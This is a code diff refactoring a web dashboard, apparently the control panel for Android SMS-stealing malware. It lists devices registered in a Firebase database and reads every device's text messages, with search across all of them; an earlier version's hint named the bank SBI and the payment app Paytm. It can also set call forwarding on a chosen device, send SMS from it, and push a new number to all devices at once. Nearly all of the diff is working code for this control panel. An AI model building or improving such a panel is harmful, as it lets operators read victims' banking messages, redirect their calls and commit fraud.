@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>CSC Admin Dashboard - No Password</title>
+<title>CSC Admin - Full Working Dashboard</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
@@ -109,7 +109,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 </style>
 </head>
 <body>
-  <!-- SETUP SCREEN - ONLY CONFIG, NO PASSWORD -->
+  <!-- SETUP SCREEN - ONLY CONFIG -->
 <div id="setup-screen">
   <div class="setup-card">
     <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin Dashboard</h1><p>Enter Firebase Details to Connect</p></div>
@@ -120,10 +120,10 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
   </div>
 </div>
 
-<!-- MAIN DASHBOARD APP -->
+<!-- MAIN APP DASHBOARD -->
 <div id="app">
   <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="disconnect()">Disconnect</button></div></div>
-  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
+  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
   <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
 </div>
 
@@ -150,10 +150,10 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 
 <div id="toast"></div>
 <script>
-// ========== GLOBAL VARIABLES - NO PASSWORD ==========
+// ========== GLOBAL VARIABLES ==========
 var DB_URL = '', API_KEY = '';
-var DEVICES_LIST = [];      // verify_device se device IDs
-var DEVICES_DATA = {};      // all data per device
+var DEVICE_IDS = [];        // All device IDs from verify_device
+var DEVICES_DATA = {};      // All data per device
 var currentDeviceKey = null;
 var selectedSim = 0;
 var pollTimer = null;
@@ -174,7 +174,7 @@ function fbSet(path, data) {
   }).then(function(r) { return r.json(); });
 }
 
-// ========== DIRECT CONNECT - NO PASSWORD CHECK ==========
+// ========== DIRECT CONNECT - NO PASSWORD ==========
 function doConnect() {
   DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
   API_KEY = document.getElementById('cfg-key').value.trim();
@@ -188,8 +188,14 @@ function doConnect() {
   btn.disabled = true;
   btn.textContent = 'Connecting...';
   
-  // Directly fetch verify_device to check connection
+  // Check if verify_device exists
   fbGet('verify_device').then(function(devices) {
+    if (!devices) {
+      showSetupErr('No "verify_device" node found in database');
+      btn.disabled = false;
+      btn.textContent = '🔗 Connect & Open Dashboard';
+      return;
+    }
     document.getElementById('setup-screen').style.display = 'none';
     document.getElementById('app').style.display = 'flex';
     loadAllData();
@@ -198,7 +204,7 @@ function doConnect() {
     btn.textContent = '🔗 Connect & Open Dashboard';
     showToast('Connected successfully!');
   }).catch(function(e) {
-    showSetupErr('Connection failed: ' + e.message + ' — Check URL/API Key');
+    showSetupErr('Connection failed: ' + e.message);
     btn.disabled = false;
     btn.textContent = '🔗 Connect & Open Dashboard';
   });
@@ -219,26 +225,28 @@ function disconnect() {
   document.getElementById('setup-screen').style.display = 'flex';
   showToast('Disconnected');
 }
-  // ========== LOAD ALL DATA ==========
+
+// ========== LOAD ALL DATA ==========
 function loadAllData() {
   // Step 1: Get all device IDs from verify_device
   fbGet('verify_device').then(function(devices) {
     if (!devices) {
       document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices found in verify_device</p></div>';
-      DEVICES_LIST = [];
+      DEVICE_IDS = [];
       updateStats();
       return;
     }
     
-    DEVICES_LIST = Object.keys(devices);
+    DEVICE_IDS = Object.keys(devices);
+    console.log('Devices found:', DEVICE_IDS.length);
     
-    // Step 2: For each device, fetch its data from all_user nodes
-    var promises = [];
-    for (var i = 0; i < DEVICES_LIST.length; i++) {
-      promises.push(fetchDeviceData(DEVICES_LIST[i]));
+    // Step 2: For each device, fetch its data
+    var allPromises = [];
+    for (var i = 0; i < DEVICE_IDS.length; i++) {
+      allPromises.push(fetchSingleDeviceData(DEVICE_IDS[i]));
     }
     
-    Promise.all(promises).then(function() {
+    Promise.all(allPromises).then(function() {
       renderDeviceList();
       updateStats();
       
@@ -246,17 +254,19 @@ function loadAllData() {
       if (searchQuery) {
         runSearch(searchQuery);
       }
+      if (currentDeviceKey && document.getElementById('detail-screen').style.display === 'flex') {
+        renderSmsList(currentDeviceKey);
+      }
     }).catch(function(e) {
-      showToast('Error loading device data: ' + e.message);
+      showToast('Error: ' + e.message);
     });
   }).catch(function(e) {
     showToast('Error loading verify_device: ' + e.message);
-    document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>Error loading devices</p></div>';
   });
 }
 
-function fetchDeviceData(deviceId) {
-  // Fetch all data for a device from different nodes in csc6/all_user
+function fetchSingleDeviceData(deviceId) {
+  // Fetch all data for one device from csc6/all_user
   return Promise.all([
     fbGet('csc6/all_user/Info/' + deviceId),
     fbGet('csc6/all_user/Sms/' + deviceId),
@@ -270,8 +280,20 @@ function fetchDeviceData(deviceId) {
     var callFor = results[3] || {};
     var data = results[4] || {};
     
-    var smsArr = objToArr(smsRaw);
-    var statusText = String(info.Status || '').toLowerCase();
+    var smsArray = [];
+    if (smsRaw && typeof smsRaw === 'object') {
+      var smsKeys = Object.keys(smsRaw);
+      for (var i = 0; i < smsKeys.length; i++) {
+        var smsItem = smsRaw[smsKeys[i]];
+        if (typeof smsItem === 'object') {
+          smsArray.push(smsItem);
+        } else {
+          smsArray.push({ body: smsItem });
+        }
+      }
+    }
+    
+    var statusText = String(info.Status || info.status || '').toLowerCase();
     var isOnline = (statusText === 'online' || statusText === '1' || statusText === 'true');
     
     DEVICES_DATA[deviceId] = {
@@ -280,7 +302,7 @@ function fetchDeviceData(deviceId) {
       id: info.DeviceId || info.deviceId || deviceId,
       battery: info.Battery || info.battery || '—',
       status: isOnline ? 'online' : 'offline',
-      sms: smsArr,
+      sms: smsArray,
       simInfo: simInfo,
       callFor: callFor,
       data: data,
@@ -304,37 +326,36 @@ function stopPolling() {
 }
 
 function updateStats() {
-  document.getElementById('s-total').textContent = DEVICES_LIST.length;
+  document.getElementById('s-total').textContent = DEVICE_IDS.length;
   var onlineCount = 0;
   var totalSms = 0;
-  for (var i = 0; i < DEVICES_LIST.length; i++) {
-    var dev = DEVICES_DATA[DEVICES_LIST[i]];
+  for (var i = 0; i < DEVICE_IDS.length; i++) {
+    var dev = DEVICES_DATA[DEVICE_IDS[i]];
     if (dev && dev.status === 'online') onlineCount++;
     if (dev && dev.sms) totalSms += dev.sms.length;
   }
   document.getElementById('s-online').textContent = onlineCount;
   document.getElementById('s-sms').textContent = totalSms;
   
-  var anyDev = DEVICES_DATA[DEVICES_LIST[0]];
-  if (anyDev && anyDev.data && anyDev.data.RegisterDate) {
-    document.getElementById('register-bar').textContent = '📅 Register Date: ' + anyDev.data.RegisterDate;
+  var firstDev = DEVICES_DATA[DEVICE_IDS[0]];
+  if (firstDev && firstDev.data && firstDev.data.RegisterDate) {
+    document.getElementById('register-bar').textContent = '📅 Register Date: ' + firstDev.data.RegisterDate;
   } else {
-    document.getElementById('register-bar').textContent = 'Total Devices: ' + DEVICES_LIST.length;
+    document.getElementById('register-bar').textContent = 'Total Devices: ' + DEVICE_IDS.length;
   }
 }
-
-// ========== RENDER DEVICE LIST ==========
+  // ========== RENDER DEVICE LIST ==========
 function renderDeviceList() {
   var container = document.getElementById('device-list');
   
-  if (DEVICES_LIST.length === 0) {
+  if (DEVICE_IDS.length === 0) {
     container.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices available</p></div>';
     return;
   }
   
   var html = '';
-  for (var i = 0; i < DEVICES_LIST.length; i++) {
-    var deviceId = DEVICES_LIST[i];
+  for (var i = 0; i < DEVICE_IDS.length; i++) {
+    var deviceId = DEVICE_IDS[i];
     var d = DEVICES_DATA[deviceId];
     if (!d) continue;
     
@@ -382,7 +403,13 @@ function renderSmsList(deviceId) {
     return;
   }
   
-  var sorted = [].concat(dev.sms).sort(function(a, b) { return getTimestamp(b) - getTimestamp(a); });
+  var sorted = [].concat(dev.sms).sort(function(a, b) { 
+    var ta = a.timestamp || a.date || a.time || 0;
+    var tb = b.timestamp || b.date || b.time || 0;
+    if (typeof ta === 'number') ta = ta > 1e10 ? ta : ta * 1000;
+    if (typeof tb === 'number') tb = tb > 1e10 ? tb : tb * 1000;
+    return tb - ta;
+  });
   
   var html = '';
   for (var i = 0; i < sorted.length; i++) {
@@ -390,10 +417,19 @@ function renderSmsList(deviceId) {
     var addr = s.address || s.sender || s.from || s.number || s.Address || 'Unknown';
     var body = s.body || s.message || s.text || s.content || s.Body || s.Message || '';
     var timeVal = s.date || s.timestamp || s.time || s.Date || '';
+    var timeStr = '';
+    if (timeVal) {
+      try {
+        var d = typeof timeVal === 'number' ? new Date(timeVal) : new Date(timeVal);
+        if (!isNaN(d.getTime())) {
+          timeStr = d.toLocaleString('en-IN');
+        }
+      } catch(e) {}
+    }
     html += '<div class="scard">' +
       '<div class="sadr">📞 From: ' + escapeHtml(String(addr)) + '</div>' +
       '<div class="sbody">' + escapeHtml(String(body)) + '</div>' +
-      '<div class="stime">🕒 ' + formatDate(timeVal) + '</div>' +
+      '<div class="stime">🕒 ' + timeStr + '</div>' +
       '</div>';
   }
   container.innerHTML = html;
@@ -408,12 +444,12 @@ function goBack() {
     document.getElementById('app').style.display = 'flex';
   }
   window.scrollTo(0, 0);
-          }
-  // ========== GLOBAL SEARCH - ALL DEVICES ==========
+}
+
+// ========== GLOBAL SEARCH ==========
 function onSearch(val) {
   var clearBtn = document.getElementById('search-clear-btn');
   clearBtn.style.display = val ? 'block' : 'none';
-  
   if (!val.trim()) {
     document.getElementById('search-screen').style.display = 'none';
     document.getElementById('app').style.display = 'flex';
@@ -430,9 +466,8 @@ function runSearch(keyword) {
   var keywordLower = keyword.toLowerCase();
   var results = [];
   
-  // Search through ALL devices' SMS
-  for (var i = 0; i < DEVICES_LIST.length; i++) {
-    var deviceId = DEVICES_LIST[i];
+  for (var i = 0; i < DEVICE_IDS.length; i++) {
+    var deviceId = DEVICE_IDS[i];
     var device = DEVICES_DATA[deviceId];
     if (!device || !device.sms) continue;
     
@@ -445,58 +480,41 @@ function runSearch(keyword) {
         matchedSms.push(sms);
       }
     }
-    
     if (matchedSms.length > 0) {
-      results.push({
-        device: device,
-        matches: matchedSms
-      });
+      results.push({ device: device, matches: matchedSms });
     }
   }
   
   var totalMatches = 0;
-  for (var i = 0; i < results.length; i++) {
-    totalMatches += results[i].matches.length;
-  }
+  for (var i = 0; i < results.length; i++) totalMatches += results[i].matches.length;
   
-  var summaryText = results.length > 0 
-    ? '🔎 "' + escapeHtml(keyword) + '" — Found in ' + results.length + ' device(s), total ' + totalMatches + ' SMS messages'
-    : '🔎 "' + escapeHtml(keyword) + '" — No matching SMS found in any device';
-  document.getElementById('search-summary').innerHTML = summaryText;
+  document.getElementById('search-summary').innerHTML = results.length > 0 
+    ? '🔎 "' + escapeHtml(keyword) + '" — Found in ' + results.length + ' device(s), total ' + totalMatches + ' SMS'
+    : '🔎 "' + escapeHtml(keyword) + '" — No matching SMS found';
   
   var container = document.getElementById('search-results-list');
-  
   if (results.length === 0) {
-    container.innerHTML = '<div class="empty"><div class="ei">🔍</div><p>No SMS found with keyword: "' + escapeHtml(keyword) + '"</p></div>';
+    container.innerHTML = '<div class="empty"><div class="ei">🔍</div><p>No SMS found for "' + escapeHtml(keyword) + '"</p></div>';
     return;
   }
   
   var html = '';
   for (var i = 0; i < results.length; i++) {
-    var result = results[i];
-    var previewSms = '';
-    var maxPreview = Math.min(3, result.matches.length);
-    for (var j = 0; j < maxPreview; j++) {
-      var sms = result.matches[j];
-      var addr = sms.address || sms.sender || sms.from || sms.number || sms.Address || '';
-      var body = sms.body || sms.message || sms.text || sms.content || sms.Body || sms.Message || '';
-      previewSms += '<div class="scard" style="margin-bottom:8px;padding:10px;">' +
-        '<div class="sadr" style="font-size:12px;">📞 ' + escapeHtml(String(addr)) + '</div>' +
-        '<div class="sbody" style="font-size:12px;">' + highlightText(escapeHtml(String(body)), keyword) + '</div>' +
+    var r = results[i];
+    var preview = '';
+    for (var j = 0; j < Math.min(2, r.matches.length); j++) {
+      var sms = r.matches[j];
+      var addr = sms.address || sms.sender || sms.from || sms.number || '';
+      var body = sms.body || sms.message || sms.text || '';
+      preview += '<div class="scard" style="margin-bottom:8px;padding:10px;">' +
+        '<div class="sadr">📞 ' + escapeHtml(String(addr)) + '</div>' +
+        '<div class="sbody">' + highlightText(escapeHtml(String(body)), keyword) + '</div>' +
         '</div>';
     }
-    
-    var moreCount = result.matches.length - 3;
-    var moreHtml = moreCount > 0 ? '<div style="font-size:12px;color:var(--purple);text-align:center;padding:8px 0 4px;">+' + moreCount + ' more SMS — Tap to view all</div>' : '';
-    
-    html += '<div class="src-card" onclick="openDevice(\'' + escapeHtml(result.device.key) + '\')">' +
-      '<div style="display:flex;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px;">' +
-      '<span class="sdlbl">📱 ' + escapeHtml(result.device.name) + '</span>' +
-      '<span class="smcnt">' + result.matches.length + ' SMS matched</span>' +
-      '</div>' +
-      previewSms +
-      moreHtml +
-      '</div>';
+    var more = r.matches.length > 2 ? '<div style="font-size:12px;color:var(--purple);text-align:center;padding:8px 0;">+' + (r.matches.length-2) + ' more — Tap to view all</div>' : '';
+    html += '<div class="src-card" onclick="openDevice(\'' + escapeHtml(r.device.key) + '\')">' +
+      '<div style="display:flex;gap:8px;margin-bottom:10px;"><span class="sdlbl">📱 ' + escapeHtml(r.device.name) + '</span><span class="smcnt">' + r.matches.length + ' SMS</span></div>' +
+      preview + more + '</div>';
   }
   container.innerHTML = html;
 }
@@ -512,9 +530,7 @@ function highlightText(text, keyword) {
   try {
     var regex = new RegExp('(' + keyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
     return text.replace(regex, '<span class="highlight">$1</span>');
-  } catch(e) {
-    return text;
-  }
+  } catch(e) { return text; }
 }
 
 // ========== CALL FORWARDING ==========
@@ -528,18 +544,16 @@ function openCallFwd() {
   
   if (keys.length) {
     for (var i = 0; i < Math.min(2, keys.length); i++) {
-      var k = keys[i];
-      var s = sims[k];
-      var num = s.number || s.phoneNumber || s.Number || s.SimNumber || '—';
-      var op = s.operator || s.carrier || s.Operator || '—';
+      var s = sims[keys[i]];
+      var num = s.number || s.phoneNumber || s.Number || '—';
+      var op = s.operator || s.carrier || '—';
       html += '<div class="sim-opt' + (i === selectedSim ? ' sel' : '') + '" onclick="selectSim(' + i + ')">' +
         '<div class="sim-ic">📶</div>' +
-        '<div class="sim-inf"><div class="sim-nm">SIM ' + (i + 1) + '</div><div class="sim-no">' + escapeHtml(String(num)) + ' · ' + escapeHtml(String(op)) + '</div></div>' +
+        '<div class="sim-inf"><div class="sim-nm">SIM ' + (i+1) + '</div><div class="sim-no">' + escapeHtml(String(num)) + ' · ' + escapeHtml(String(op)) + '</div></div>' +
         '<div class="sim-rb' + (i === selectedSim ? ' chk' : '') + '"></div></div>';
     }
   } else {
-    html = '<div class="sim-opt sel" onclick="selectSim(0)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 1</div><div class="sim-no">Default SIM</div></div><div class="sim-rb chk"></div></div>' +
-      '<div class="sim-opt" onclick="selectSim(1)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 2</div><div class="sim-no">Not available</div></div><div class="sim-rb"></div></div>';
+    html = '<div class="sim-opt sel" onclick="selectSim(0)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 1</div><div class="sim-no">Default</div></div><div class="sim-rb chk"></div></div>';
   }
   
   document.getElementById('sim-list').innerHTML = html;
@@ -548,153 +562,66 @@ function openCallFwd() {
   openDialog('dlg-cf');
 }
 
-function selectSim(i) {
-  selectedSim = i;
-  var simOpts = document.querySelectorAll('.sim-opt');
-  for (var j = 0; j < simOpts.length; j++) {
-    simOpts[j].classList.toggle('sel', j === i);
-    var rb = simOpts[j].querySelector('.sim-rb');
-    if (rb) rb.classList.toggle('chk', j === i);
-  }
-}
+function selectSim(i) { selectedSim = i; var opts = document.querySelectorAll('.sim-opt'); for (var j = 0; j < opts.length; j++) { opts[j].classList.toggle('sel', j === i); var rb = opts[j].querySelector('.sim-rb'); if (rb) rb.classList.toggle('chk', j === i); } }
 
 function doCF(action) {
   var num = document.getElementById('cf-number').value.trim();
-  if (action !== 'check' && !num) { showToast('Please enter forwarding number'); return; }
+  if (action !== 'check' && !num) { showToast('Enter number'); return; }
   
   var path = 'csc6/all_user/Call_For/' + currentDeviceKey;
-  
   if (action === 'check') {
     fbGet(path).then(function(data) {
-      var resDiv = document.getElementById('cf-result');
-      resDiv.style.display = 'block';
-      if (data && data.ForwardTo) {
-        resDiv.textContent = '📞 Forward To: ' + data.ForwardTo + ' | Status: ' + (data.Status || 'active');
-      } else {
-        resDiv.textContent = 'No call forwarding configured for this device';
-      }
-    }).catch(function() { showToast('Check failed'); });
+      var res = document.getElementById('cf-result');
+      res.style.display = 'block';
+      if (data && data.ForwardTo) res.textContent = '📞 Forward To: ' + data.ForwardTo + ' | Status: ' + (data.Status || 'active');
+      else res.textContent = 'No call forwarding configured';
+    });
     return;
   }
-  
   fbSet(path, { ForwardTo: num, Status: action, Sim: selectedSim + 1, updatedAt: Date.now() }).then(function() {
-    showToast(action === 'active' ? '✅ Call Forwarding Activated!' : '✅ Call Forwarding Deactivated!');
+    showToast(action === 'active' ? '✅ Activated!' : '✅ Deactivated!');
     closeDialog('dlg-cf');
   }).catch(function(e) { showToast('Error: ' + e.message); });
 }
 
 // ========== SMS SEND ==========
-function openSmsSend() {
-  document.getElementById('sms-to').value = '';
-  document.getElementById('sms-msg').value = '';
-  openDialog('dlg-sms');
-}
-
+function openSmsSend() { document.getElementById('sms-to').value = ''; document.getElementById('sms-msg').value = ''; openDialog('dlg-sms'); }
 function doSendSms() {
   var to = document.getElementById('sms-to').value.trim();
   var msg = document.getElementById('sms-msg').value.trim();
-  if (!to || !msg) { showToast('Both number and message required'); return; }
-  
-  fbSet('csc6/all_user/SendSms/' + currentDeviceKey, {
-    to: to,
-    message: msg,
-    status: 'pending',
-    timestamp: Date.now()
-  }).then(function() {
-    showToast('✅ SMS command sent to device!');
+  if (!to || !msg) { showToast('Number and message required'); return; }
+  fbSet('csc6/all_user/SendSms/' + currentDeviceKey, { to: to, message: msg, status: 'pending', timestamp: Date.now() }).then(function() {
+    showToast('✅ SMS command sent!');
     closeDialog('dlg-sms');
   }).catch(function(e) { showToast('Error: ' + e.message); });
 }
 
 // ========== UPDATE NUMBER ==========
-function openUpdateNo() {
-  document.getElementById('update-num').value = '';
-  openDialog('dlg-update');
-}
-
+function openUpdateNo() { document.getElementById('update-num').value = ''; openDialog('dlg-update'); }
 function doUpdateNo() {
   var num = document.getElementById('update-num').value.trim();
-  if (!num) { showToast('Please enter a number'); return; }
-  
-  if (DEVICES_LIST.length === 0) { showToast('No devices found'); return; }
-  
+  if (!num) { showToast('Enter number'); return; }
+  if (DEVICE_IDS.length === 0) { showToast('No devices'); return; }
   var completed = 0;
-  for (var i = 0; i < DEVICES_LIST.length; i++) {
-    var deviceId = DEVICES_LIST[i];
-    fbSet('csc6/all_user/UpdateNo/' + deviceId, num).then(function() {
+  for (var i = 0; i < DEVICE_IDS.length; i++) {
+    fbSet('csc6/all_user/UpdateNo/' + DEVICE_IDS[i], num).then(function() {
       completed++;
-      if (completed === DEVICES_LIST.length) {
-        showToast('✅ Updated ' + completed + ' device(s)!');
-        closeDialog('dlg-update');
-      }
+      if (completed === DEVICE_IDS.length) { showToast('✅ Updated ' + completed + ' device(s)!'); closeDialog('dlg-update'); }
     }).catch(function() {
       completed++;
-      if (completed === DEVICES_LIST.length) {
-        showToast('⚠️ Partial update completed');
-        closeDialog('dlg-update');
-      }
+      if (completed === DEVICE_IDS.length) { showToast('⚠️ Partial update'); closeDialog('dlg-update'); }
     });
   }
 }
 
 // ========== UTILITIES ==========
-function objToArr(obj) {
-  if (!obj || typeof obj !== 'object') return [];
-  var arr = [];
-  var keys = Object.keys(obj);
-  for (var i = 0; i < keys.length; i++) {
-    var k = keys[i];
-    var v = obj[k];
-    var item = { _key: k };
-    if (typeof v === 'object' && v !== null) {
-      for (var prop in v) {
-        item[prop] = v[prop];
-      }
-    } else {
-      item.value = v;
-    }
-    arr.push(item);
-  }
-  return arr;
-}
-
-function getTimestamp(item) {
-  var t = item.timestamp || item.date || item.time || item.Date || 0;
-  if (typeof t === 'number') return t > 1e10 ? t : t * 1000;
-  try { return new Date(t).getTime() || 0; } catch(e) { return 0; }
-}
-
-function formatDate(t) {
-  if (!t) return '';
-  try {
-    var d = typeof t === 'number' ? (t > 1e10 ? new Date(t) : new Date(t * 1000)) : new Date(t);
-    if (isNaN(d.getTime())) return String(t);
-    return d.toLocaleString('en-IN', {
-      day: '2-digit', month: '2-digit', year: 'numeric',
-      hour: '2-digit', minute: '2-digit', second: '2-digit'
-    });
-  } catch(e) { return String(t); }
-}
-
-function escapeHtml(s) {
-  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-}
-
-function openDialog(id) {
-  document.getElementById(id).style.display = 'flex';
-}
-
-function closeDialog(id) {
-  document.getElementById(id).style.display = 'none';
-}
-
+function escapeHtml(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
+function openDialog(id) { document.getElementById(id).style.display = 'flex'; }
+function closeDialog(id) { document.getElementById(id).style.display = 'none'; }
 var overlays = document.querySelectorAll('.overlay');
 for (var i = 0; i < overlays.length; i++) {
-  overlays[i].addEventListener('click', function(e) {
-    if (e.target === this) this.style.display = 'none';
-  });
+  overlays[i].addEventListener('click', function(e) { if (e.target === this) this.style.display = 'none'; });
 }
-
 function showToast(msg) {
   var toast = document.getElementById('toast');
   toast.textContent = msg;
